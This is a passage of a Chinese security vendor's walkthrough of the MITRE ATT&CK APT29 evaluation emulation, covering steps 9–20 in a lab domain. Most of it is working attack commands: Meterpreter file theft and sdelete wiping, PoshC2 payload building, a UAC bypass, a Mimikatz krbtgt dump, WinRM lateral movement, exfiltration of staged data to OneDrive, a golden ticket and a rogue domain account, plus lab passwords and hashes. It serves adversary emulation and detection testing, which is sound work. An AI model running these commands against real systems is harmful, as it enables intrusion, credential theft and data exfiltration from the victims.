[meterpreter] > `upload "/home/kali/payloads/day1/Seaduke/rar.exe" "C:\\Windows\\Temp\\Rar.exe"` 

[meterpreter] > `upload "/home/kali/payloads/day1/SysinternalsSuite/sdelete64.exe" "C:\\Windows\\Temp\\sdelete64.exe"`

**9.B** 

[meterpreter] > `execute -f powershell.exe -i -H` 

PS C:\Windows\system32> `$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*jack*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force` 

PS C:\Program Files\SysinternalsSuite>`cd C:\Windows\Temp` 

PS C:\Program Files\SysinternalsSuite>`.\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip"` 

PS C:\Program Files\SysinternalsSuite> `exit` 

[meterpreter] >`download "C:\\Users\\jack\\Desktop\\working.zip" .`

**9.C** 

[meterpreter] >`shell` 

[meterpreter (Shell)] > `cd "C:\Windows\Temp"` 

[meterpreter (Shell)] > `.\sdelete64.exe /accepteula "C:\Windows\Temp\Rar.exe"` 

[meterpreter (Shell)] > `.\sdelete64.exe /accepteula "C:\Users\jack\AppData\Roaming\working.zip"` 

[meterpreter (Shell)] > `.\sdelete64.exe /accepteula "C:\Users\jack\Desktop\working.zip"` 

[meterpreter (Shell)] > `del "C:\Windows\Temp\sdelete64.exe"` 

**终止会话** 

[meterpreter (Shell)] >`exit` 

[meterpreter] >`exit` 

msf> `exit`

### Step 10 - 持久性执行

初始受害者重新启动，使用合法用户登录，此活动将触发先前建立的持久性机制，即执行新服务（T1035）和 Windows 启动文件夹（T1060）中的有效负载。启动文件夹中的有效负载使用被盗的令牌执行后续的有效负载（T1106，T1134）。

**10.A** 

**重启初始受害者；等待系统启动。收到具有 SYSTEM 权限的 meterpreter 会话。**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6U8XniaVlJsOEkQgosO1ic7453dicnJzt7ULqWomtXbGlIx2yrGexsfmyuQ/640?wx_fmt=png)

**10.B** 

**通过登录初始受害者打开我的电脑，双击 C 盘，触发启动文件夹的持久性。**  

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UC8lrtqIEpiaMQUM6XicH36kvxzy0ribLDIhVW63eDSt1Za0BMg2DE2g9Q/640?wx_fmt=png)

### 清理后门  

Cmd >`sc delete “javamtsup”` 

Powershell > `Remove-Item -Force -Path "HKLM:\SOFTWARE\Javasoft"` 

Powershell > `Remove-Item "C:\Windows\System32\hostui.exe"` 

Powershell > `Remove-Item "C:\Windows\System32\hostui.bat"` 

Powershell > `Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\hostui.lnk"`

清理两台受害者系统的 C:\Windows\Temp 目录。

第 2 天
-----

红队设置
----

```
#新建poshC2项目
$ posh-project -n p1
#修改配置
$ posh-config
#开启服务
$ posh-server
#进入交互式
$ posh
```

Payload 生成
----------

**Payload1: schemas.ps1** 

/var/poshc2/p1/payloads/payload.bat，仅将编码部分插入 $enc_ps（第 11 行）schemas.ps1

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UtlJvOpvhQdYLlHFia5Btnl6v70Rl8KsxoLENGu2DDXNTiaFwc6C4x9Lw/640?wx_fmt=png)

**Payload2: stepFifteen_wmi.ps1** 

将 / var/poshc2/p1/payloads/payload.bat 所有内容复制到 CommandLineTemplate 变量

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6Uuax1FibVALTMdW3qhWddda8IS7HSiaZibjh6UUiakzzmGd8ibr6p1o0KH8g/640?wx_fmt=png)

**Payload3：stepFourteen_bypassUAC.ps1** 

将 / var/poshc2/p1/payloads/payload.bat 所有内容复制放入 - Value 变量（第二行）  

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6Uw3mZfIuqU2USbgWl4qU668wTSNQicCicKUcRlHeictWuLeWWfIqmSibhfQ/640?wx_fmt=png)

**Payload4：blob** 

在 Windows 主机上生成 DLL 负载：  

1.[CMD]> `certutil -encode [file].dll blob`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6Ul1BnoCUY86fEIq7S1ODudhiaFqzGhW68rcrhxNTdSpvHYnq0ddsJ9lA/640?wx_fmt=png)

2.[CMD]> `powershell`3.[PS]> `$blob = (Get-Content .\blob) -join ""; $blob > .\blob`

4.blob 在文本编辑器中打开文件

5. 删除文件末尾的新行并复制所有内容 6. 将值粘贴到 $bin 变量（第 6 行）中 schemas.ps1

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UzOIS47jp9XYiclfMnWag7L071KYicce8dFAR3riaBTpVAZABBoRRCHxSw/640?wx_fmt=png)

**Payload5：stepFourteen_credDump.ps1** 

参考下方注释。  

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6Umr57afFhgSQ5lN3DVQKJ7nFod0R9qYl0PJ6UzkFRvkYwaRt04rdRag/640?wx_fmt=png)

**Payload6：Invoke-Mimikatz-Evals.ps1** 

把第 1 行函数名改为 Invoke-Mimikatz-Evals，第 886 行注释，替换成 $GetProcAddress = $UnsafeNativeMethods.GetMethod(‘GetProcAddress’, [reflection.bindingflags] “Public,Static”, $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);  

> 参考：https://github.com/PowerShellMafia/PowerSploit/issues/293

受害者设置
-----

对于最初的受害者（具有 Microsoft Outlook 的工作站）：

1. 启用对 Microsoft Outlook 的程序访问（https://www.slipstick.com/developer/change-programmatic-access-options/）2. 打开 Outlook 并登录 3. 将以下文件复制到初始受害者的桌面上：

a) 2016_United_States_presidential_election_-_Wikipedia.html 

b) make_lnk.ps1 

c) schemas.ps1

4. 复制 MITRE-ATTACK-EVALS.HTML 到受害者的 “文档” 文件夹中 5. 执行 make_lnk.ps1（右键单击 > 使用 PowerShell 运行），将生成 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk6. 拖动 make_lnk.ps1 和 schemas.ps1 到回收站，然后清空回收站

开始
--

### Step 11 – 初始违规

最初的违规行为是合法用户单击（T1204）链接文件有效负载，该链接负载执行在隐藏的另一个伪文件（T1096）上执行的备用数据流（ADS），该伪文件是作为网络钓鱼活动的一部分提供的。ADS 执行一系列枚举命令，以确保在通过 Windows 注册表运行键条目（T1060）建立持久性之前，它没有在虚拟化分析环境（T1497，T1082，T1120，T1033，T1016，T1057，T1083）中执行。嵌入式 DLL 有效负载，该有效负载已解码并拖放到磁盘（T1140）。然后，ADS 执行 PowerShell 暂存器（T1086），该暂存器使用 HTTPS 协议（T1071，T1032）通过端口 443（T1043）创建 C2 连接。

**11.A** 

**以 apt.local\john 用户身份执行 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk（双击），输出将显示在终端中。获得 PoshC2 会话。**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UU6Aa9l7SicWYlXVSYuIDA0n77OeXWTJ8iaIId5p44uFFVUD7spEZ6UPg/640?wx_fmt=png)

### Step 12 - 强化访问  

攻击者修改了先前建立的持久性机制中使用的 DLL 有效载荷（T1099）的时间属性，以匹配在受害者的 System32 目录（T1083）中找到的随机文件的时间属性。然后，攻击者枚举 Windows 注册表（T1012）中记录的用户安装的已注册 AV 产品（T1063）和软件。

 **12.A** 

PS 1>`loadmoduleforce /home/kali/payloads/day2/timestomp.ps1` 

PS 1>`timestomp C:\Users\jack\AppData\Roaming\Microsoft\kxwn.lock` 

**切换到 posh-server 查看日志**

**12.B** 

PS 1> `loadmoduleforce /home/kali/payloads/day2/stepTwelve.ps1` 

PS 1> `detectav`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UNKsXGTzBBTQhgaEjXW5Ss0atSUzvaOlkRqOMlaZJBheqRJoTZIFuvw/640?wx_fmt=png)

**12.C** 

PS 1> `software`  

### Step 13 - 本地枚举

攻击者使用各种 Windows API 调用执行本地枚举，特别是收集本地计算机名（T1082），域名（T1063），当前用户上下文（T1016）和正在运行的进程（T1057）。

**13.A** 

PS 1> `loadmoduleforce /home/kali/payloads/day2/stepThirteen.ps1` 

PS 1> `comp` 

**13.B**

 PS 1> `domain` 

**13.C** 

PS 1> `user` 

**13.D** 

PS 1> `pslist`

### Step 14 – 提权

攻击者通过用户帐户控制（UAC）绕过（T1122，T1088）提升特权。然后，攻击者使用新的提升的访问权限在自定义 WMI 类（T1047）中创建和执行代码，该类将下载（T1105）并执行 Mimikatz 来转储纯文本凭据（T1003），该纯文本凭据经过解析，编码和存储在 WMI 中 类（T1027）。在跟踪 WMI 执行已完成（T1057）之后，攻击者读取存储在 WMI 类中的纯文本凭据（T1140）。

**14.A** 

PS 1> `loadmoduleforce /home/kali/payloads/day2/stepFourteen_bypassUAC.ps1` 

PS 1> `bypass` 

**获得一个高权限新的会话。**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UYn3talSgPiadq0wQg0vYsfjvg4RPvqhpovMrs7aRhIngkBvLOP7DD0g/640?wx_fmt=png)

**14.B**  

Kali:

`$ cd /home/kali/payloads/day2/` `$ python2 -m SimpleHTTPServer 8080` 

**切换到新的高权限会话中**

PS 2> `loadmoduleforce /home/kali/payloads/day2/stepFourteen_credDump.ps1` 

PS 2> `wmidump` 

**切换到 posh-server 查看是否抓取到明文密码，如果没有参考受害者系统准备第 8 条。**

### Step 15 - 建立持久性

攻击者通过创建 WMI 事件订阅（T1084）以在当前用户（T1033）登录时执行 PowerShell 有效负载，来建立对受害者的持久访问的辅助手段。

**15.A** 

PS 2>`loadmoduleforce /home/kali/payloads/day2/stepFifteen_wmi.ps1` 

PS 2> `wmi` 

**注意：不要再次使用 RDP 登录访问，否则将触发打算用于步骤 20 的持久性执行。**

### Step 16 - 横向运动

攻击者通过 Windows API（T1106）枚举环境的域控制器（T1018）和域的安全标识符（SID）（T1033）。接下来，攻击者使用以前转储的凭据（T1078）创建到域控制器的远程 PowerShell 会话（T1028）。通过此连接，攻击者将在步骤 14 中使用的 Mimikatz 二进制文件复制到域控制器（T1105），然后转储 KRBTGT 帐户的哈希（T1003）。

**16.A** 

**切换到低权限会话** 

PS 1> `loadmoduleforce /home/kali/payloads/day2/powerview.ps1` 

PS 1>`get-netdomaincontroller`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UIYtSdt4kkUN8jCDIrugxI49Bsj9eKxB29xP1DBXDU0pCHlnyGFPUuw/640?wx_fmt=png)

**16.B** 

PS 1> `loadmoduleforce /home/kali/payloads/day2/stepSixteen_SID.ps1` 

PS 1>`siduser`  

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UO2B5FibRYD9wXXjV7TyjF3LX8aj4gTkIkGL0WRxicgAETwial4UfRuVKQ/640?wx_fmt=png)

**保存域 SID 并删除 RID，Sid: S-1-5-21-374680414-1105030488-2607252970**  

**16.C** 

**切换到新的高权限会话中** 

PS 2>`loadmoduleforce /home/kali/payloads/day2/Invoke-WinRMSession.ps1` 

PS 2> `invoke-winrmsession -Username "apt.local\john" -Password "Passw0rd!" -IPAddress 10.0.0.100`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UrdlogIR2ETXl6xbf4diauZdciafOyqT8U6YS67KoJ591wDqKBQ9R1bEw/640?wx_fmt=png)

PS 2>`Invoke-Command -Session $oejtw -scriptblock {Get-Process} | out-string` 

**记住 session_id，注意：如果在此遇到错误，请重新启动域控制器，然后在重新执行** **16.C 之前重新运行 2 个 winrm 安装程序命令。**

**16.D** 

PS 2> `Copy-Item m.exe -Destination "C:\Windows\System32\" -ToSession $oejtw` 

PS 2> `Invoke-Command -Session $oejtw -scriptblock {C:\Windows\System32\m.exe privilege::debug "lsadump::lsa /inject /name:krbtgt" exit} | out-string`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UuawM6mdnCtQUVPIf3KcXMRUbiczIWPtKA9Q7UZvo6ErxgKoMyAyVx6w/640?wx_fmt=png)

PS 2> `Get-PSSession | Remove-PSSession` 

**保存 NTLM hash，NTLM : 5fae7c899798b24d56c697f86e8cc7d6**  

### Step 17 – 收集

攻击者在收集（T1005）和暂存（T1074）感兴趣的文件之前，先收集存储在本地电子邮件客户端（T1114）中的电子邮件。暂存文件将被压缩（T1002），并带有 GIF 文件类型的魔术字节（T1027）。

**17.A** 

切换到低权限会话 

PS 1> `loadmoduleforce /home/kali/payloads/day2/stepSeventeen_email.ps1` 

PS 1> `psemail`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UbQclH32U25CxzVEdOOrlB6DFUwoq1RGiakvkHqBianhKiaxj5Q2dR21Dg/640?wx_fmt=png)

**17.B** 

**切换到新的高权限会话中** 

PS 2> `New-Item -Path "C:\Windows\Temp\" -Name "WindowsParentalControlMigration" -ItemType "directory"` 

PS 2> `Copy-Item "C:\Users\john\Documents\MITRE-ATTACK-EVALS.HTML" -Destination "C:\Windows\Temp\WindowsParentalControlMigration"`  

**17.C** 

PS 2> `loadmoduleforce /home/kali/payloads/day2/stepSeventeen_zip.ps1` 

PS 2> `zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration`

### Step 18 – 渗出

攻击者将本地驱动器映射到在线 Web 服务帐户（T1102），然后将先前暂存的数据提取到此存储库（T1048）。

**18.A**

> 获得 OneDrive 账户的 CID (参考：https://www.laptopmag.com/articles/map-onedrive-network-drive)

PS 2> `net use y: https://d.docs.live.net/E3_________C93 /user:apt.local@outlook.com "D{IFt&______-@XV"` 

PS 2> `Copy-Item "C:\Windows\Temp\WindowsParentalControlMigration.tmp" -Destination "Y:\WindowsParentalControlMigration.tmp"` 

**登录 OneDrive 查看。**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UVZRLpCob2j2YM5WTym16LLWHibkv4uh6tQsxaZQK5XWYLo25gQ6Vd2w/640?wx_fmt=png)

### Step 19 - 清理  

攻击者通过在 powershell.exe 中反射性加载并执行 Sdelete 二进制文件（T1055），删除与该访问相关的各种文件（T1107）。

**19.A** 

PS 2> `loadmoduleforce /home/kali/payloads/day2/wipe.ps1` 

PS 2> `wipe "C:\Windows\System32\m.exe"` 

**注意：此处存在 ETW 的一个已知错误（Invoke-ReflectivePEInjection 即时修补 ETW 调用的函数），因此 callback 可能会死机并挂起。**

**19.B** 

PS 2> `wipe "C:\Windows\Temp\WindowsParentalControlMigration.tmp"` 

**19.C** PS 2> `wipe "C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML"`

### Step 20 - 利用持久性

初始受害者重新启动，使用合法用户登录，此活动将触发先前建立的持久性机制，即 Windows 注册表运行键引用的 DLL 有效负载（T1085）的执行和 WMI 事件订阅（T1084），后者执行新的 PowerShell 暂存器（T1086）。攻击者使用来自先前漏洞的材料，使用新的访问权限来生成 Kerberos Golden Ticket（T1097），该材料用于与新受害者建立远程 PowerShell 会话（T1028）。通过此连接，攻击者在域内创建一个新帐户（T1136）。

**20.A** 

PS 2> `restart-computer -force` 

**使用 RDP 登录受害者系统，持久性机制应在登录时触发 (1 for DLL, 1 or more for WMI event subscription)**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6Uts5DsiblTUA6QQgU7UTlzMHRDGAeLgv8AzWymyNmZ8ic4FsFuxVIeHPQ/640?wx_fmt=png)

**注意：您可能需要重复登录过程几次（关闭并重新打开 RDP 会话），WMI 执行才能触发**  

**20.B** 

**切换到 System 权限的会话中** 

PS 3>`klist purge` 

PS 3>`loadmoduleforce /home/kali/payloads/day2/Invoke-Mimikatz-Evals.ps1` 

PS 3> `Invoke-Mimikatz-Evals -command '"kerberos::golden /domain:apt.local /sid:S-1-5-21-374680414-1105030488-2607252970 /rc4:5fae7c899798b24d56c697f86e8cc7d6 /user:john /ptt"'` 

PS 3> `klist`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UChtaCcqDkO3nqD8YHtiaa9pHibWyLDTo5Zy6iaBOebEEQlJ6TpiaC8Zq0g/640?wx_fmt=png)

PS 3> `Enter-PSSession PC1` 

PS 3>`Invoke-Command -ComputerName PC1 -ScriptBlock {net user /add toby "pamBeesly<3"}`  

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UcXtQw4eXzedJx9YhLhscH9Ae8pOKz9gKSmyzbXKcqazybpVvicPvTUw/640?wx_fmt=png)

### 清理后门  

删除 C:\Users\john\AppData\Roaming\Microsoft\kxwn.lock 

使用 Autoruns 删除 Logon 中 WebCache 注册表 

使用 Autoruns 删除 WMI 下的启动项

通过 Azure Resource Manager (ARM) 模板部署 ATT＆CK APT29 评估环境
------------------------------------------------------

1.https://medium.com/threat-hunters-forge/mordor-labs-part-1-deploying-att-ck-apt29-evals-environments-via-arm-templates-to-create-1c6c4bc32c9a2.https://medium.com/threat-hunters-forge/mordor-labs-part-2-executing-att-ck-apt29-evals-emulation-plan-day1-17fae7a812293.https://medium.com/threat-hunters-forge/mordor-labs-part-3-executing-att-ck-apt29-evaluations-emulation-plan-day2-417cadc2a337

评估过程视频
------

Day 1 : https://youtu.be/fJAuBrzYTzI

Day 2 : https://youtu.be/PzYKvfwoHEY

参考链接
----

1.https://attackevals.mitre-engenuity.org/APT29/2.https://mitre-attack.github.io/attack-navigator/enterprise/#layerURL=https%3A%2F%2Fraw.githubusercontent.com%2Fmitre-attack%2Fattack-evals%2Fmaster%2FAPT29_Round2_Navigator_layer.json3.https://github.com/n1nj4sec/pupy4.https://github.com/rapid7/metasploit-framework5.https://github.com/nettitude/PoshC26.https://github.com/center-for-threat-informed-defense/adversary_emulation_library7.https://github.com/carbonblack/tau-tools/tree/master/threat_emulation/Invoke-APT298.https://github.com/mitre-attack/attack-arsenal/tree/master/adversary_emulation/APT299.https://github.com/OTRF/detection-hackathon-apt2910.https://www.carbonblack.com/blog/invoke-apt29-adversarial-threat-emulation/11.https://github.com/nettitude/PoshC2/blob/master/resources/modules/Invoke-WinRMSession.ps112.https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1

**关于山石网科**

  

  

  

山石网科是中国网络安全行业的技术创新领导厂商，自成立以来一直专注于网络安全领域前沿技术的创新，提供包括边界安全、云安全、数据安全、内网安全在内的网络安全产品及服务，致力于为用户提供全方位、更智能、零打扰的网络安全解决方案。山石网科为金融、政府、运营商、互联网、教育、医疗卫生等行业累计超过 18,000 家用户提供高效、稳定的安全防护。山石网科在苏州、北京和美国硅谷均设有研发中心，业务已经覆盖了中国、美洲、欧洲、东南亚、中东等 50 多个国家和地区。